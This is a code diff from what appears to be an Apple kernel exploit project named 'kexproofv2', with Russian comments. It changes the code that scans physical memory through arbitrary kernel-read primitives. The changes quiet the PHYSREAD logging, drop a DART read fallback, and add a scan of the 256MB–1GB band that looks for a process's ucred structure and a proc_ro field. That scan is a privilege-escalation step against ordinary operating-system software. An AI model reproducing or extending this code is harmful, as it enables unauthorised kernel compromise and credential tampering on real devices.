@@ -172,6 +172,8 @@ static BOOL kpDartPAInWindow(uint64_t pa, NSMutableString *r, const char *tag)
     return YES;
 }
 
+static BOOL gPhysreadVerbose = NO;   // 2.0.10: PHYSREAD-логи — спам (16MB syslog)
+
 static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
                           uint64_t targetPA, uint8_t *out, NSMutableString *r)
 {
@@ -226,7 +228,7 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
         uint64_t e0 = buf ? early_kread64(buf + 0x30) : 0;
         BOOL ok = buf && cnt && cnt < 0x1000 && (uint32_t)e0 != 0 &&
                   ((uint32_t)(e0 >> 32) == 0 || (uint32_t)(e0 >> 32) == 4);
-        kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA=%#llx rdPA=%#llx type=%#llx buf=%#llx cnt=%#x entry0=%#018llx — %@",
+        if (gPhysreadVerbose) kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA=%#llx rdPA=%#llx type=%#llx buf=%#llx cnt=%#x entry0=%#018llx — %@",
                   (unsigned long long)rdVA, (unsigned long long)rdPA, (unsigned long long)typ, (unsigned long long)buf, cnt,
                   (unsigned long long)e0, ok ? @"OK" : @"маркеры МИМО"]);
         if (ok) rdBuf = buf;
@@ -269,14 +271,14 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
             uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dsS);
             if (spR) memcpy(out, spR, 0x4000);
             IOSurfaceUnlock(dsS, 0, NULL);
-            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x",
+            if (gPhysreadVerbose) kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x",
                       (unsigned long long)targetPA, rkr, *(uint32_t *)out, fR]);
             done = YES;
         } else {
-            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] fresh pipe: open kr=0x%x", ok2]);
+            if (gPhysreadVerbose) kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] fresh pipe: open kr=0x%x", ok2]);
         }
     } else {
-        kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA/rdBuf нет (rdVA=%#llx) — чтение пропущено", (unsigned long long)rdVA]);
+        if (gPhysreadVerbose) kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA/rdBuf нет (rdVA=%#llx) — чтение пропущено", (unsigned long long)rdVA]);
     }
     CFRelease(rdS);
     CFRelease(dsS);
@@ -8274,7 +8276,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             // proc-объекта из census) — вот они и добавлены.
                             // 1GB-пол закрывает нижние минные PA.
                             BOOL whitelisted = (t == 0x10 || t == tSafe1 || t == tSafe2 ||
-                                                t == 0x0e || t == 0x21 ||
+                                                t == 0x0e || t == 0x21 || t == 0x37 ||
                                                 t == 0x11 || t == 0x13 || t == 0x17 || t == 0x18);
                             if (!whitelisted && (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18)) continue;
                             if (!whitelisted) continue;
@@ -8312,60 +8314,48 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             if (typeHist[hi]) [hg appendFormat:@" %d:%u", hi, typeHist[hi]];
                         kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] гистограмма типов (кадров %llu, нет-таблицы %u):%@",
                                   (unsigned long long)idx, typeNoTable, hg.length ? hg : @" пусто"]);
-                        // kexproofv2 2.0.8: fallback — нижний спан (PA<1GB) через
-                        // DART-чтение (sentinel вместо паники, в отличие от
-                        // kernel aperture). Только whitelist-типы. 2.0.6/2.0.7
-                        // прочитали всё ≥1GB без хита — ucred либо внизу, либо
-                        // в мелком типе.
-                        if ((!pagePA || !roFieldPA) && svc && tsdV && ttM && isTable) {
-                            kpNote(r, @"  [SCAN-Z2-LOW] DART-проход: нижний спан (idx<0x10000, whitelist) + тип 0x37 (весь диапазон)");
-                            uint64_t lowReads = 0;
-                            for (uint64_t li = 0; li < nF && (!pagePA || !roFieldPA); li++) {
+                        // kexproofv2 2.0.10: fallback — полоса 256MB..1GB тем же
+                        // kernel-путём (быстро). DART-проход убит: за окном он
+                        // возвращает sentinel на каждом кадре (2.0.9 лог:
+                        // sig=0x5a5a5a5a на 0x10002f28000, темп 3 кадра/сек).
+                        // Пол 256MB: смерть 05:58 была на PA 8..108MB.
+                        if ((!pagePA || !roFieldPA)) {
+                            kpNote(r, @"  [SCAN-Z2-BAND] kernel-проход 256MB..1GB (whitelist + 0x37)");
+                            uint64_t bandReads = 0;
+                            for (uint64_t li = (0x10000000ULL >> 14); li < (0x40000000ULL >> 14) && (!pagePA || !roFieldPA); li++) {
                                 uint64_t lpa = pB + (li << 14);
                                 int lt = kpFrameTypeOf(lpa);
-                                BOOL lowWL = (lt == 0x10 || lt == tSafe1 || lt == tSafe2 ||
-                                              lt == 0x0e || lt == 0x21 ||
-                                              lt == 0x11 || lt == 0x13 || lt == 0x17 || lt == 0x18);
-                                // 2.0.9: 0x37 (845 кадров) — единственный крупный
-                                // непрочитанный тип; DART-чтение безопасно для него.
-                                BOOL want = (lt == 0x37) || (li < (0x40000000ULL >> 14) && lowWL);
-                                if (!want) continue;
-                                uint8_t cimg2[0x4000];
-                                if (!kpPhysRead16K(svc, tsdV, ttM, isTable, lpa, cimg2, r)) continue;
-                                // sentinel 0x5A = DART не прочитал (фильтр/пусто)
-                                uint64_t q0s = 0; memcpy(&q0s, cimg2, 8);
-                                if (q0s == 0x5A5A5A5A5A5A5A5AULL) continue;
-                                lowReads++;
-                                if ((li & 0xFFF) == 0)
-                                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] прогресс %#llx (чтений %llu)",
-                                              (unsigned long long)li, (unsigned long long)lowReads]);
-                                if (!pagePA) {
-                                    uint64_t lb = 0; memcpy(&lb, cimg2 + uoff2 + 0x78, 8);
-                                    uint32_t lu = 0; memcpy(&lu, cimg2 + uoff2 + 0x18, 4);
-                                    if (lb == labelQ && lu == uid32) {
-                                        BOOL full = YES;
-                                        for (uint32_t i = 0; i < 0x100; i += 8)
-                                            if (memcmp(cimg2 + i, ucImg + i, 8)) { full = NO; break; }
-                                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] ucred-кандидат pa=%#llx (тип %d) — сверка: %@",
-                                                  (unsigned long long)lpa, lt, full ? @"СОШЛАСЬ ★" : @"мимо"]);
-                                        if (full) pagePA = lpa;
-                                    }
+                                BOOL lw = (lt == 0x10 || lt == tSafe1 || lt == tSafe2 ||
+                                           lt == 0x0e || lt == 0x21 || lt == 0x37 ||
+                                           lt == 0x11 || lt == 0x13 || lt == 0x17 || lt == 0x18);
+                                if (!lw) continue;
+                                uint64_t pkva3 = useLinear ? (lpa - pB + vB) : phystokv(lpa);
+                                if (!pkva3) continue;
+                                bandReads++;
+                                if ((li & 0x1FFF) == 0)
+                                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-BAND] прогресс %#llx (чтений %llu)",
+                                              (unsigned long long)li, (unsigned long long)bandReads]);
+                                if (!pagePA && early_kread64(pkva3 + uoff2 + 0x78) == labelQ &&
+                                    (uint32_t)early_kread64(pkva3 + uoff2 + 0x18) == uid32) {
+                                    BOOL full = YES;
+                                    for (uint32_t i = 0; i < 0x100; i += 8)
+                                        if (early_kread64(pkva3 + i) != *(uint64_t *)(ucImg + i)) { full = NO; break; }
+                                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-BAND] ucred-кандидат pa=%#llx (тип %d) — сверка: %@",
+                                              (unsigned long long)lpa, lt, full ? @"СОШЛАСЬ ★" : @"мимо"]);
+                                    if (full) pagePA = lpa;
                                 }
-                                if (!roFieldPA && roOff >= 8 && roOff + 0x18 < 0x4000) {
-                                    uint64_t f0 = 0, f1 = 0, f2 = 0, fm = 0;
-                                    memcpy(&fm, cimg2 + roOff, 8);
-                                    memcpy(&f0, cimg2 + roOff - 8, 8);
-                                    memcpy(&f1, cimg2 + roOff + 8, 8);
-                                    memcpy(&f2, cimg2 + roOff + 0x10, 8);
-                                    if (fm == ucF && f0 == roFp0 && f1 == roFp1 && f2 == roFp2) {
-                                        roFieldPA = lpa + roOff;
-                                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] ★ proc_ro поле: pa=%#llx — PSWAP-B вооружён",
-                                                  (unsigned long long)roFieldPA]);
-                                    }
+                                if (!roFieldPA && roOff >= 8 && roOff + 0x18 < 0x4000 &&
+                                    early_kread64(pkva3 + roOff) == ucF &&
+                                    early_kread64(pkva3 + roOff - 8) == roFp0 &&
+                                    early_kread64(pkva3 + roOff + 8) == roFp1 &&
+                                    early_kread64(pkva3 + roOff + 0x10) == roFp2) {
+                                    roFieldPA = lpa + roOff;
+                                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-BAND] ★ proc_ro поле: pa=%#llx",
+                                              (unsigned long long)roFieldPA]);
                                 }
                             }
-                            kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] финиш: чтений=%llu ucredPA=%#llx roFieldPA=%#llx",
-                                      (unsigned long long)lowReads, (unsigned long long)pagePA, (unsigned long long)roFieldPA]);
+                            kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-BAND] финиш: чтений=%llu ucredPA=%#llx roFieldPA=%#llx",
+                                      (unsigned long long)bandReads, (unsigned long long)pagePA, (unsigned long long)roFieldPA]);
                         }
                     }
                 }
